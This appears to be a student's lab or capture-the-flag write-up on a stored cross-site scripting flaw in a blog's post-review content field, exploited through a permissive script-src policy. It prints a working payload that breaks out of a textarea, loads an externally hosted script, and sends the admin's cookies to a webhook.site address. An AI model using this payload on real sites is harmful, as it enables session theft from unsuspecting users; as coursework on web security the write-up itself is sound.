# ist193587

## Vulnerabilty

Cross-site scripting.

## Where

On the add a new blogpost for review especifically in content area

## Impact

Allows the user to execute script commands on the admin's browser in this case to get the cookies

## Steps to Reproduce

1. First thing i did was look into `script-src *` to see what this does and find out that the website has a flaw, it's able to read from any website that it is given.
2. With this in mind i figured that using `sigma` was the easiest way to have a website with javascript code in it. So after login in i created a javascript file in the web directory named `readMyLips.js` , with this content `window.location.replace("https://webhook.site/<random_identifier_you_were_given>?cookie="+document.cookie)` . Getting a website that had only the javascript in it `https://web.tecnico.ulisboa.pt/<istxxxxxx>/readMyLips.js` . 
3. Having this we insert in the Content textbox this payload `Content </textarea> <script src="https://web.tecnico.ulisboa.pt/<istxxxxxx>/readMyLips.js"> </script>` . This way we can get the admin cookies.

